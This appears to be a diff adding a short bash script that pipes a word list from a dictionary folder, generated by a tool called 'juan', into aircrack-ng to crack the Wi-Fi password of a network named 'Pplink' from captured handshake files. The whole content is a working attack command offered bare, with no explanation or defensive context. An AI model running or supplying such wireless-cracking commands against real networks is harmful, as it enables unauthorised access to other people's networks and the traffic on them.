@@ -1,0 +1,3 @@
+#!/bin/bash
+
+juan diccionarios/common-default/ | aircrack-ng -e Pplink -w - ch11*.cap
